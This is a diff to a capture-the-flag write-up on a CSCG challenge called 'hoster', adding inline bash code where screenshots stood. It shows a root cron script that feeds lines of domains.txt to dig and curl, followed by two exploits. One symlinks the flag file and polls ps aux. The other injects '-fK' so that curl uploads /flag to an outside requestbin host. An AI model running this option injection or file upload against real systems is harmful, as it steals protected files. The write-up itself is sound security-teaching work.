@@ -25,7 +25,28 @@ But nothing is going on in `/etc/crontab` where usually cronjobs are written. So
 
 It seems like the cron job is simply running the `request_certificates.sh` script. All this script does is to iterate over each line of your `domains.txt` checking for a valid certificate and then executing the curl command:
 
-![req-certs](ctf/writeups/cscg/hoster/req_certs.png "req-certs")
+```bash
+#!/bin/bash
+
+for file in /var/www/*; do
+    echo "$file"
+    if [ -f $file/config/domains.txt ]
+    then
+        while IFS="" read -r p || [ -n "$p" ]
+        do
+            if ( dig "$p" | grep -q 'NXDOMAIN' ) || ( dig "$p" 2>&1 | grep -q 'Invalid' ) || ( dig "$p" | grep -q 'SERVFAIL' )
+            then
+                echo "[-] Error resolving the domain"
+            else
+                curl -I "$p"
+                # certbot -d "$p"
+            fi
+        done < $file/config/domains.txt
+    else
+        echo "[-] Not a file"
+    fi
+fi
+```
 
 So having a look again at the output of **PSPY** the `domains.txt` must contain a line *cscg.de* which is part of the arguments for the curl command.
 
@@ -36,16 +57,31 @@ My initial thoughts were some kind of bash command injection via the *$file* in 
 
 # 4. Exploitation<a name="exploitation"></a>
 ## 4.1 Exploitation Variant 1<a name="exploitation variant 1"></a>
-My approach was exploiting the script via a symlink with `ln -s  /flag config/domains.txt` pointing to `/flag` so the script would read the content of your flag file and give it as a parameter to the dig command. By running **PSPY** you will just see the dig command being executed with the flag as the parameter. Of course, there are other possible solutions to reveal the flag by simply spamming `ps aux` and searching for the flag prefix or writing some small script doing this for you:
+My approach was exploiting the script via a symlink with `ln -s  /flag config/domains.txt` pointing to `/flag` so the script would read the content of your flag file and give it as a parameter to the dig command. By running **PSPY** you will just see the dig command being executed with the flag as the parameter. Of course, there are other possible solutions to reveal the flag by `for (( ; ; )); do ps aux >> log; done` effectively spamming `ps aux` and searching for the flag prefix or writing some small script doing this for you:
 
-![exp-var-1](ctf/writeups/cscg/hoster/exp_var_1.png "exp-var-1")
+```bash
+search_string="CSCG"
+while true; do
+    ps_output=$(ps aux)
+    if [[ "$ps_output" == *"$search_string"* ]]; then
+            echo $ps_output
+            break;
+    fi
+done
+```
 
 ## 4.2 Exploitation Variant 2<a name="exploitation variant 2"></a>
 The intended solution was about command option injection. The problem was to find a parameter fitting both the dig and the `curl` commands and eventually upload the content of `/flag` to your server. With the -K option for `curl` you can define a path of a config file being used by `curl`. But there is a little problem with this parameter. The `dig` command doesn’t have an option -K so the if statement around `dig` in the script will fail. You need another option that won’t result in an output of dig containing *NXDOMAIN*, *Invalid* and *SERVFAIL*. Additionally, this option has to be a valid option for the `curl` command. There were multiple options like the `-f` argument which is the option for a silent fail in `curl` and the option to define a file path for `dig` to interact with. By defining a config file for curl with content like
 
-![exp-var-2](ctf/writeups/cscg/hoster/exp_var_2.png "exp-var-2")
+```bash
+echo "-fK/tmp/config" > config/domains.txt
+cat <<EOF > /tmp/config
+url = https://...pipedream.net
+upload-file = /flag
+EOF
+```
 
-and inserting `-fK/<path-to-config>` into the `domains.txt`, the cronjob will eventually upload the file to your server
+the cronjob will eventually upload the file to your server
 
 ![flag-requestbin](ctf/writeups/cscg/hoster/flag_requestbin.png "flag-requestbin")
 
